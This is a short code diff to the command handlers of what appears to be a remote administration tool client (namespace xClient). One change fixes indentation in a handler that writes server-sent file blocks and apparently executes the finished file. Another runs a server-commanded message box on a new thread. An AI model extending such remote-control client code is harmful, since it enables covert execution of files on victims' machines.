@@ -109,7 +109,7 @@ namespace xClient.Core.Commands
 				if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
 				{
 					new Packets.ClientPackets.Status(string.Format("Writing failed: {0}", destFile.LastError)).Execute(client);
-				    return;
+					return;
 				}
 
 				if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
@@ -470,7 +470,13 @@ namespace xClient.Core.Commands
 
 		public static void HandleShowMessageBox(Packets.ServerPackets.ShowMessageBox command, Client client)
 		{
-			MessageBox.Show(null, command.Text, command.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
+			new Thread(() =>
+			{
+				MessageBox.Show(null, command.Text, command.Caption,
+					(MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton),
+					(MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
+			}).Start();
+
 			new Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
 		}
 
